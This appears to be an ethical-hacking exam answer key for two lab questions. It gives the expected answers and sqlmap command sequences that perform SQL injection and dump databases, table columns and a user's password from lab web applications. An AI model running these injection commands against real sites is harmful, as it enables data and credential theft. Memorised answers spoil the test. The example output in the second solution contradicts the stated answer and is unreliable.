13. Perform an SQL injection attack on your target web application
cinema.cehorg.com and extract the password of user Daniel. You have already registered on
the website with credentials Karen/computer. (Format: aaaaaaaaaa)
Answer: qwertyuiop
Solution:
1. Run sqlmap:
Open a terminal and run sqlmap against the vulnerable URL or parameter. For example, if the search field
is vulnerable:
sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" --dump
2. Identify the Database and Tables:
Use sqlmap to list the databases:
sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" --dbs
Once you identify the database, list its tables:
sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" -D database_name --tables
3. Extract the User Table:
Identify the table containing user information (e.g., users , accounts , etc.):
sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" -D database_name -T users --columns
Dump the data from the relevant columns (e.g., username , password ):
sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" -D database_name -T users -C username,password --dump
Assuming sqlmap successfully extracts the data, the output might look like this:
Database: cinema
Table: users
[2 entries]
+---------+-------------+
| username | password |
+---------+-------------+
| Daniel | qwertyuiop |
| Karen | computer |

16. Perform SQL injection attack on a web application, cybersec.cehorg.com,
available at 192.168.44.40. Find the value in the Flag column in one of the DB tables and enter
it as the answer. (Format: *aNNaNAA)
Answer: ^r39d4YI
Solution:
Step 1: Launch sqlmap with Crawl, Level, and Risk Parameters

1. Open a Terminal:
Launch your terminal or command prompt.

2. Run sqlmap with Parameters:
Use sqlmap with the following command to perform an automated SQL injection attack with aggressive crawling, high level, and risk settings:

shCopy code
sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 --dbs

Explanation of parameters:
u "http://192.168.44.40" : Specifies the URL of the vulnerable web application.
-crawl=3 : Crawls the website up to depth 3 to discover additional parameters and pages vulnerable to SQL injection.
-level=5 : Sets the level of tests to perform. Higher levels test more thoroughly.
-risk=3 : Sets the risk of tests to perform. Higher risks test more aggressively.

Step 2: Identify the Database and Tables

1. Review the Discovered Databases:
Once sqlmap completes crawling, it will list the databases it discovered. Identify the relevant database containing the Flag column.

2. Select the Target Database:
Choose the database that likely contains the Flag column. This typically involves examining the names or performing additional automated tests using sqlmap.

Step 3: Extract Data from Tables

1. List Tables in the Database:
Use sqlmap to list tables within the identified database:
shCopy code
sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -
-tables

2. Dump Data from Relevant Tables:
Once tables are identified, dump data from the tables to search for the Flag column:
shCopy code
sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -
T table_name --columns

Identify the column containing the Flag information.

3. Retrieve Data from the Flag Column:
Finally, dump the contents of the Flag column from the identified table:
shCopy code
sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -
T table_name -C Flag --dump

Step 4: Retrieve the Flag Value
1. Review the Output:
After executing the final command, sqlmap will display the contents of the Flag column. Look for the value that matches the required format aNNaNAA .

Example Output
Assuming sqlmap identifies the Flag column in the users table and the flag value is Secret123 :

diffCopy code
+------+-----------+
| id | Flag |
+------+-----------+
| 1 | Secret123 |
+------+-----------+
